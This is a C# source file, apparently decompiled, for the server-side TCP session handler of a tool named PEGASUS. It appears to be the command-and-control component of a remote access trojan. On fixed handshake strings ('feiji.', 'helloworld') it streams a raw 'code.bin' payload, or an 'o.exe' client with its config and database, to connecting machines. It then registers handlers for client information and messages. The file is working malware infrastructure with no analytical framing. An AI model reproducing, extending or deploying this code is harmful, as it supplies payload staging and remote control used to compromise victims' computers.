using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PEGASUS.Module;
using PEGASUS.TCP;
using PEGASUS.Tools;

namespace Sockets
{ 

public class TcpClientSession
{
	public object _ObjRecvbytes = new object();

	public string _sessionKey;

	public IPEndPoint _remoteEndPoint;

	public IPEndPoint _localEndPoint;

	public string _senssionSign;

	public int _HeadPacketSize;

	public bool _FristPacket = true;

	public object SendSync = new object();

	public NetworkStream _netstream;

	public List<byte> _HeadAndPayloadPacket = new List<byte>();

	public TcpServer _tcpServer;

	public TcpClient _tcpClient;

	public IAsyncEventDispatcher _Idispatchar;

	public ClientInfomation _cif;

	public TcpClientSession(TcpClient tcpClient, TcpServer tcpServer)
	{
		_tcpClient = tcpClient;
		_tcpServer = tcpServer;
		_sessionKey = Guid.NewGuid().ToString();
		_remoteEndPoint = (IPEndPoint)_tcpClient.Client.RemoteEndPoint;
		_localEndPoint = (IPEndPoint)_tcpClient.Client.LocalEndPoint;
		_Idispatchar = new IAsyncEventDispatcher(this);
		_cif = new ClientInfomation();
	}

	~TcpClientSession()
	{
	}

	private void SetSocketOptions()
	{
		_tcpClient.Client.IOControl(IOControlCode.KeepAliveValues, KeepAlive(1, 30000, 10000), null);
	}

	private byte[] KeepAlive(int onOff, int keepAliveTime, int keepAliveInterval)
	{
		byte[] array = new byte[12];
		BitConverter.GetBytes(onOff).CopyTo(array, 0);
		BitConverter.GetBytes(keepAliveTime).CopyTo(array, 4);
		BitConverter.GetBytes(keepAliveInterval).CopyTo(array, 8);
		return array;
	}

	public async Task AsyncClientRecv()
	{
		try
		{
			_netstream = _tcpClient.GetStream();
			while (_tcpClient.Connected)
			{
				byte[] _readbyte = new byte[16192];
				int num = await _netstream.ReadAsync(_readbyte, 0, 16192);
				if (num == 0)
				{
					throw new Exception();
				}
				byte[] array = new byte[num];
				Buffer.BlockCopy(_readbyte, 0, array, 0, num);
				lock (_ObjRecvbytes)
				{
					_tcpServer.RecvBytes += num;
				}
				_HeadAndPayloadPacket.AddRange(array);
				SplitPacket();
			}
		}
		catch (Exception ex)
		{
			Close();
			throw ex;
		}
	}

	private void SplitPacket()
	{
		try
		{
			if (_FristPacket)
			{
				_senssionSign = Encoding.UTF8.GetString(_HeadAndPayloadPacket.GetRange(0, _HeadAndPayloadPacket.Count).ToArray());
				if (_senssionSign.Equals("feiji."))
				{
					byte[] array = File.ReadAllBytes(Application.StartupPath + "\\file\\code.bin");
					_netstream.Write(BitConverter.GetBytes(array.Length), 0, 4);
					_netstream.Write(array, 0, array.Length);
					throw new Exception(" pppgod");
				}
				if (_senssionSign.Equals("helloworld"))
				{
					byte[] array2 = File.ReadAllBytes(Application.StartupPath + "\\file\\o.exe");
					byte[] array3 = File.ReadAllBytes(Application.StartupPath + "\\file\\o.exe.config");
					byte[] array4 = File.ReadAllBytes(Application.StartupPath + "\\file\\client.db");
					using MemoryStream memoryStream = new MemoryStream();
					using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
					binaryWriter.Write(BitConverter.GetBytes(array2.Length));
					binaryWriter.Write(BitConverter.GetBytes(array3.Length));
					binaryWriter.Write(BitConverter.GetBytes(array4.Length));
					binaryWriter.Write(array2);
					binaryWriter.Write(array3);
					binaryWriter.Write(array4);
					byte[] array5 = memoryStream.ToArray();
					_netstream.Write(array5, 0, array5.Length);
					throw new Exception(" helloworld");
				}
				if (!_senssionSign.Contains("-"))
				{
					_tcpServer.ClientMessage(_remoteEndPoint.Address.ToString() + "  ....Evil Connecting.....?", null);
					throw new Exception();
				}
				_Idispatchar.Register(DataType.InformationType, _cif.ClientInfoExecute);
				_Idispatchar.Register(DataType.ClientMessage, ClientMessage);
				_HeadPacketSize = 1 + _senssionSign.Length + 8;
				_FristPacket = false;
				_HeadAndPayloadPacket.Clear();
				_tcpServer.ClientConnected(this, null);
			}
			else
			{
				if (_HeadAndPayloadPacket.Count < _HeadPacketSize)
				{
					return;
				}
				TcpHeartPacket tcpHeartPacket = TcpHeartPacket.ByteToStruct(_HeadAndPayloadPacket.GetRange(0, _HeadPacketSize).ToArray());
				if (!tcpHeartPacket._senssionSign.Equals(_senssionSign))
				{
					_HeadAndPayloadPacket.Clear();
				}
				else if (tcpHeartPacket._PayloadSize > 16192)
				{
					_HeadAndPayloadPacket.Clear();
				}
				else if (_HeadAndPayloadPacket.Count - _HeadPacketSize >= tcpHeartPacket._PayloadSize)
				{
					if (_HeadAndPayloadPacket.Count - _HeadPacketSize > tcpHeartPacket._PayloadSize)
					{
						_Idispatchar.DispatchMessageHandler(tcpHeartPacket, _HeadAndPayloadPacket.GetRange(_HeadPacketSize, tcpHeartPacket._PayloadSize).ToArray());
						_HeadAndPayloadPacket.RemoveRange(0, tcpHeartPacket._PayloadSize + _HeadPacketSize);
						SplitPacket();
					}
					if (_HeadAndPayloadPacket.Count - _HeadPacketSize == tcpHeartPacket._PayloadSize)
					{
						_Idispatchar.DispatchMessageHandler(tcpHeartPacket, _HeadAndPayloadPacket.GetRange(_HeadPacketSize, tcpHeartPacket._PayloadSize).ToArray());
						_HeadAndPayloadPacket.Clear();
					}
				}
			}
		}
		catch (Exception ex)
		{
			_HeadAndPayloadPacket.Clear();
			_tcpServer.ClientMessage(_remoteEndPoint.Address.ToString() + ex.Message, null);
			throw ex;
		}
	}

	public void Client_Send(DataType dt, byte[] payload)
	{
		try
		{
			lock (SendSync)
			{
				if (!_tcpClient.Connected)
				{
					Close();
					throw new Exception();
				}
				List<byte> list = new List<byte>();
				list.AddRange(TcpHeartPacket.StructToByte(new TcpHeartPacket(_senssionSign, payload.Length, (int)dt)));
				list.AddRange(payload);
				_tcpServer.SendBytes += list.ToArray().Length;
				_netstream.Write(list.ToArray(), 0, list.ToArray().Length);
			}
		}
		catch (Exception ex)
		{
			throw ex;
		}
	}

	public void ClientMessage(TcpClientSession tcs, byte[] bt)
	{
		_tcpServer.ClientMessage(tcs._remoteEndPoint.Address.ToString() + Encoding.UTF8.GetString(bt), null);
	}

	public void Close()
	{
		try
		{
			_tcpClient?.Client.Shutdown(SocketShutdown.Both);
			_netstream?.Dispose();
			_tcpClient?.Close();
			_tcpClient?.Dispose();
			_cif?.destroy();
			_Idispatchar?.destroy();
			_HeadAndPayloadPacket?.Clear();
		}
		catch
		{
		}
		finally
		{
			_Idispatchar = null;
			_netstream = null;
			_tcpClient = null;
			_HeadAndPayloadPacket = null;
			_tcpServer = null;
		}
	}
}
}